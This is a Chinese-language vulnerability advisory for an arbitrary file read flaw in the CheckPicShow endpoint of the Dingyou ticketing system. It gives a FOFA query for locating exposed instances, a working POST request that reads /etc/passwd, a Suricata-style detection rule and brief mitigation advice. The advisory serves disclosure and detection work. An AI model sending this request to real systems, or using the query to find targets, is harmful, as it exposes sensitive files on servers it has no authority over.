# 鼎游票务系统CheckPicShow存在任意文件读取漏洞

鼎游票务系统CheckPicShow存在任意文件读取漏洞，攻击者可进行读取系统内任意敏感信息。

# 影响版本

鼎游票务系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/book/showgoodsIndex.action"

POC/EXP：

```
POST /home/CheckPicShow.action HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 86

pic=/etc/passwd
```

![image-20260929132413188](assets/image-20260929132413188.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"鼎游票务系统 - /home/CheckPicShow.action pic 任意文件读取";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri;
        content:"/home/CheckPicShow.action";
        fast_pattern;
    http.content_type; content:"application/x-www-form-urlencoded";
    http.request_body;
        content:"pic=";
        content:"/etc/passwd"; distance:0; nocase;
    metadata:
        service http,
        affected_product "鼎游票务系统",
        vulnerability_type "Arbitrary File Read",
        severity "high";
    classtype:web-application-attack;
    sid:1000762;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
